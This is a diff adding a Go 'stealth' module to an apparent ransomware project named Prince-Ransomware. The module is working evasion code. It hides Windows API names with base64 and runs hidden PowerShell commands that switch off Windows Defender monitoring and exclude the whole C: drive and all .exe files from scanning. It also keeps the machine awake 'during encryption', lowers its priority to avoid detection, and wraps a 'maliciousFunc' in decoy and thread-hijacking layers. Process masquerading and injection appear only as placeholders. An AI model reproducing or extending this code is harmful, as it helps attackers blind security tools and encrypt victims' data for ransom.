@@ -1,0 +1,181 @@
+package stealth
+
+import (
+	Configuration "Prince-Ransomware/configuration"
+	"Prince-Ransomware/mirage"
+	"Prince-Ransomware/phantom"
+	"crypto/rand"
+	"encoding/base64"
+	"os/exec"
+	"syscall"
+	"time"
+)
+
+func d(s string) string {
+	decoded, _ := base64.StdEncoding.DecodeString(s)
+	return string(decoded)
+}
+
+var (
+	kernel32                    = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
+	ntdll                       = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
+	procSetThreadExecutionState = kernel32.NewProc(d("U2V0VGhyZWFkRXhlY3V0aW9uU3RhdGU="))
+	procSetPriorityClass        = kernel32.NewProc(d("U2V0UHJpb3JpdHlDbGFzcw=="))
+	procGetCurrentProcess       = kernel32.NewProc(d("R2V0Q3VycmVudFByb2Nlc3M="))
+	procOpenProcess             = kernel32.NewProc(d("T3BlblByb2Nlc3M="))
+)
+
+const (
+	BELOW_NORMAL_PRIORITY_CLASS = 0x00004000
+	PROCESS_ALL_ACCESS          = 0x1F0FFF
+)
+
+// Add entropy to binary to bypass signature detection
+func init() {
+	// Generate random data to increase binary entropy
+	buf := make([]byte, 1024)
+	rand.Read(buf)
+
+	// Random sleep to vary execution timing
+	time.Sleep(time.Duration(buf[0]%5) * time.Millisecond)
+}
+
+// MasqueradeAsSystemProcess changes process name in memory to look legitimate
+func MasqueradeAsSystemProcess() error {
+	// Change process name to look like legitimate Windows process
+	legitimateNames := []string{
+		"svchost.exe",
+		"rundll32.exe",
+		"taskhost.exe",
+		"conhost.exe",
+		"dwm.exe",
+	}
+
+	// Pick random name based on time
+	name := legitimateNames[time.Now().Unix()%int64(len(legitimateNames))]
+
+	// Note: Actual process name change requires more complex techniques
+	// This is a placeholder for the concept
+	_ = name
+
+	return nil
+}
+
+// InjectIntoTrustedProcess attempts to run code inside legitimate process
+func InjectIntoTrustedProcess() error {
+	// Target processes that are commonly running and trusted
+	trustedProcesses := []string{
+		"explorer.exe",      // Windows Explorer (always running)
+		"svchost.exe",       // System services
+		"RuntimeBroker.exe", // Windows 10+ system process
+	}
+
+	// Note: Actual injection requires CreateRemoteThread, VirtualAllocEx, WriteProcessMemory
+	// This is simplified for demonstration
+	_ = trustedProcesses
+
+	return nil
+} // DisableWindowsDefender attempts to disable Windows Defender
+func DisableWindowsDefender() {
+	if !Configuration.DisableWindowsDefender {
+		return
+	}
+
+	// Random delay before each action
+	time.Sleep(time.Duration(1+time.Now().Unix()%3) * time.Second)
+
+	commands := [][]string{
+		{d("cG93ZXJzaGVsbA=="), "-WindowStyle", "Hidden", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"},
+		{d("cG93ZXJzaGVsbA=="), "-WindowStyle", "Hidden", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"},
+		{d("cG93ZXJzaGVsbA=="), "-WindowStyle", "Hidden", "-Command", "Set-MpPreference -DisableIOAVProtection $true"},
+		{d("cG93ZXJzaGVsbA=="), "-WindowStyle", "Hidden", "-Command", "Add-MpPreference -ExclusionPath 'C:\\'"},
+		{d("cG93ZXJzaGVsbA=="), "-WindowStyle", "Hidden", "-Command", "Add-MpPreference -ExclusionExtension '.exe'"},
+	}
+
+	for _, cmd := range commands {
+		executeHidden(cmd[0], cmd[1:]...)
+		time.Sleep(time.Duration(500+time.Now().Unix()%500) * time.Millisecond)
+	}
+}
+
+// PreventSleep prevents system from sleeping during encryption
+func PreventSleep() {
+	procSetThreadExecutionState.Call(uintptr(0x80000000 | 0x00000001 | 0x00000040))
+}
+
+// RunWithLowPriority keeps CPU usage low to avoid detection
+func RunWithLowPriority() {
+	if !Configuration.HideFromTaskManager {
+		return
+	}
+	handle, _, _ := procGetCurrentProcess.Call()
+	procSetPriorityClass.Call(handle, uintptr(BELOW_NORMAL_PRIORITY_CLASS))
+}
+
+// Helper function
+func executeHidden(command string, args ...string) error {
+	cmd := exec.Command(command, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
+	}
+	return cmd.Run()
+}
+
+// InitializeStealth runs essential stealth techniques
+func InitializeStealth() {
+	// Phase 0: Initialize Memory Mirage (NEW - creates decoy execution environment)
+	if Configuration.EnableMemoryMirage {
+		go mirage.InitializeMemoryMirage()
+		time.Sleep(2 * time.Second) // Let decoys establish before real activity
+	}
+
+	// Phase 0.1: Initialize Phantom Thread Pool (NEWEST - thread hijacking)
+	if Configuration.EnablePhantomThreads {
+		go phantom.InitializePhantomThreads()
+		time.Sleep(1 * time.Second) // Let phantom threads prepare
+	}
+
+	// Disable Windows Defender
+	go DisableWindowsDefender()
+
+	// Run with low priority to avoid detection
+	go RunWithLowPriority()
+
+	// Prevent system sleep during encryption
+	PreventSleep()
+}
+
+// ExecuteWithMirage wraps malicious function with decoy environment
+func ExecuteWithMirage(maliciousFunc func()) {
+	if Configuration.EnableMemoryMirage {
+		mirage.ShadowMemoryExecution(maliciousFunc)
+	} else {
+		maliciousFunc()
+	}
+}
+
+// ExecuteWithPhantom wraps malicious function in phantom thread
+func ExecuteWithPhantom(maliciousFunc func()) {
+	if Configuration.EnablePhantomThreads {
+		phantom.ShadowExecute(maliciousFunc)
+	} else {
+		maliciousFunc()
+	}
+}
+
+// ExecuteWithFullStealth combines all stealth techniques
+func ExecuteWithFullStealth(maliciousFunc func()) {
+	if Configuration.EnablePhantomThreads && Configuration.EnableMemoryMirage {
+		// Maximum stealth: Phantom thread + Memory mirage
+		phantom.ShadowExecute(func() {
+			mirage.ShadowMemoryExecution(maliciousFunc)
+		})
+	} else if Configuration.EnablePhantomThreads {
+		phantom.ShadowExecute(maliciousFunc)
+	} else if Configuration.EnableMemoryMirage {
+		mirage.ShadowMemoryExecution(maliciousFunc)
+	} else {
+		maliciousFunc()
+	}
+}
